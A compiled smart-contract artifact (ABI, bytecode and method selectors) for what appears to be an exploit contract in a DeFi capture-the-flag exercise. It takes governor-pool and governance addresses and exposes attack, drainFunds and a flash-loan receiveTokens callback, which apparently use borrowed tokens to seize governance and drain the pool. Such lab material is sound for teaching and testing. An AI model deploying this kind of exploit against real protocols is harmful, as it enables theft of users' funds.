{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_governorPoolAddress",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_simpleGovernanceAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "TOKENS_IN_POOL",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "TOKEN_INITIAL_SUPPLY",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "drainFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "token",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "borrowAmount",
          "type": "uint256"
        }
      ],
      "name": "receiveTokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": {
    "object": "0x608060405234801561001057600080fd5b5060405161058738038061058783398101604081905261002f9161008c565b600080546001600160a01b039384166001600160a01b03199182161790915560018054929093169181169190911790915560028054909116331790556100bf565b80516001600160a01b038116811461008757600080fd5b919050565b6000806040838503121561009f57600080fd5b6100a883610070565b91506100b660208401610070565b90509250929050565b6104b9806100ce6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c80632f7cb3b71461005c578063357291301461008057806336c20dcf14610095578063733ef936146100a75780639e5faafc146100af575b600080fd5b61006e6a013da329b633647180000081565b60405190815260200160405180910390f35b61009361008e36600461039c565b6100b7565b005b61006e6a01a784379d99db4200000081565b610093610254565b610093610332565b600380546001600160a01b0319166001600160a01b038416908117909155600482815560408051634b88b8ad60e11b81529051639711715a9282810192602092919082900301816000875af1158015610114573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061013891906103d4565b506001546000546040513060248201526001600160a01b039283169263c21f37ca92169060440160408051601f198184030181529181526020820180516001600160e01b0316630cf2091360e01b1790525160e084901b6001600160e01b03191681526101ac9291906000906004016103ed565b600060405180830381600087803b1580156101c657600080fd5b505af11580156101da573d6000803e3d6000fd5b505060405163a9059cbb60e01b8152336004820152602481018490526001600160a01b038516925063a9059cbb91506044016020604051808303816000875af115801561022b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061024f919061045a565b505050565b6001805460405163c0c1cf5560e01b815260048101929092526001600160a01b03169063c0c1cf5590602401600060405180830381600087803b15801561029a57600080fd5b505af11580156102ae573d6000803e3d6000fd5b50506003546002546004805460405163a9059cbb60e01b81526001600160a01b039384169281019290925260248201529116925063a9059cbb91506044016020604051808303816000875af115801561030b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061032f919061045a565b50565b600054604051639ab603b960e01b81526a013da329b633647180000060048201526001600160a01b0390911690639ab603b990602401600060405180830381600087803b15801561038257600080fd5b505af1158015610396573d6000803e3d6000fd5b50505050565b600080604083850312156103af57600080fd5b82356001600160a01b03811681146103c657600080fd5b946020939093013593505050565b6000602082840312156103e657600080fd5b5051919050565b60018060a01b038416815260006020606081840152845180606085015260005b818110156104295786810183015185820160800152820161040d565b8181111561043b576000608083870101525b5060408401949094525050601f91909101601f19160160800192915050565b60006020828403121561046c57600080fd5b8151801515811461047c57600080fd5b939250505056fea2646970667358221220d18b9bb613b0d874fed2bde803f18b0c5b473d017ec4d337c081f069e170427a64736f6c634300080f0033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "TOKENS_IN_POOL()": "2f7cb3b7",
    "TOKEN_INITIAL_SUPPLY()": "36c20dcf",
    "attack()": "9e5faafc",
    "drainFunds()": "733ef936",
    "receiveTokens(address,uint256)": "35729130"
  },
  "id": 44
}